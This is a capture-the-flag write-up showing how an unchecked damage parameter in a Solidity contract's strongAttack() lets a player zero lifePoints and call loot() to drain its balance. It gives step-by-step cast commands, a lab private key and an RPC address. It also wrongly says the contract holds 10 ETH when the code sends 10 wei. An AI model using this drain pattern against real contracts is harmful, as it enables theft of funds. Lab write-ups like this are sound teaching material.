# Survival of the Fittest — Blockchain Challenge Writeup

## Overview

This challenge involves interacting with a deployed smart contract and exploiting a logic flaw to drain its balance. The environment provides a private blockchain along with endpoints to retrieve connection details and the flag.

---

## Challenge Objective

From `Setup.sol`:

```solidity
function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```

The goal is to drain all Ether from the `Creature` contract.

---

## Provided Endpoints

* `/connection_info` → Returns private key, addresses
* `/rpc` → JSON-RPC endpoint for blockchain interaction
* `/flag` → Returns the flag after solving
* `/restart` → Resets the instance

---

## Connection Details

```json
{
  "PrivateKey": "0x2d73081ac832cdf6e49e54fcf1c1161db6e2c7a63a2be403de9d0a1e836bf0ba",
  "Address": "0x561F396143f8066cD16C5b76928bEE7731b01EC8",
  "TargetAddress": "0x7b719b56f0D220Aeb86Ada56d66Fb6e282564528",
  "setupAddress": "0xd3Bf21eb091c28EEF28c3A3A1Ef9765ed864Ac00"
}
```

RPC Endpoint:

```
http://154.57.164.80:30354/rpc
```

---

## Contract Analysis

### Setup.sol

```solidity
constructor() payable {
    require(msg.value == 1 ether);
    TARGET = new Creature{value: 10}();
}
```

* Deploys the `Creature` contract
* Funds it with 10 ETH

---

### Creature.sol

```solidity
uint256 public lifePoints;

constructor() payable {
    lifePoints = 20;
}
```

Initial state:

* `lifePoints = 20`
* Contract balance = 10 ETH

---

### Attack Functions

```solidity
function strongAttack(uint256 _damage) external {
    _dealDamage(_damage);
}

function punch() external {
    _dealDamage(1);
}
```

Internal logic:

```solidity
function _dealDamage(uint256 _damage) internal {
    aggro = msg.sender;
    lifePoints -= _damage;
}
```

---

### Loot Function

```solidity
function loot() external {
    require(lifePoints == 0, "Creature is still alive!");
    payable(msg.sender).transfer(address(this).balance);
}
```

To withdraw funds, `lifePoints` must be exactly 0.

---

## Vulnerability

There is no validation on the `_damage` parameter in `strongAttack()`.

This allows an attacker to directly control how much damage is applied to `lifePoints`.

---

## Exploit Strategy

Initial state:

```
lifePoints = 20
```

Exploit:

```
strongAttack(20)
→ lifePoints = 0
```

Then:

```
loot()
```

This drains all ETH from the contract.

---

## Exploitation Steps

### 1. Set Environment Variables

```bash
export RPC_URL=http://154.57.164.80:30354/rpc
export PRIVATE_KEY=0x2d73081ac832cdf6e49e54fcf1c1161db6e2c7a63a2be403de9d0a1e836bf0ba
export TARGET=0x7b719b56f0D220Aeb86Ada56d66Fb6e282564528
export SETUP=0xd3Bf21eb091c28EEF28c3A3A1Ef9765ed864Ac00
```

---

### 2. Verify Initial State (Optional)

```bash
cast call $TARGET "lifePoints()(uint256)" --rpc-url $RPC_URL
```

Expected:

```
20
```

---

### 3. Perform Attack

```bash
cast send $TARGET "strongAttack(uint256)" 20 \
--rpc-url $RPC_URL \
--private-key $PRIVATE_KEY
```

---

### 4. Drain Funds

```bash
cast send $TARGET "loot()" \
--rpc-url $RPC_URL \
--private-key $PRIVATE_KEY
```

---

### 5. Verify Solution

```bash
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC_URL
```

Expected:

```
true
```

---

### 6. Retrieve Flag

```bash
curl http://154.57.164.80:30354/flag
```

---

## Key Takeaways

* Always validate user-controlled inputs in smart contracts
* Logic flaws can be as dangerous as low-level vulnerabilities
* Solidity 0.8 prevents underflow, but not flawed logic
* Direct state manipulation is a common CTF exploitation pattern

---

## Conclusion

The challenge is solved by exploiting the lack of validation in the `strongAttack` function. By applying damage equal to the total life points, we reduce the creature’s health to zero and successfully call `loot()` to drain the contract balance, satisfying the `isSolved()` condition.
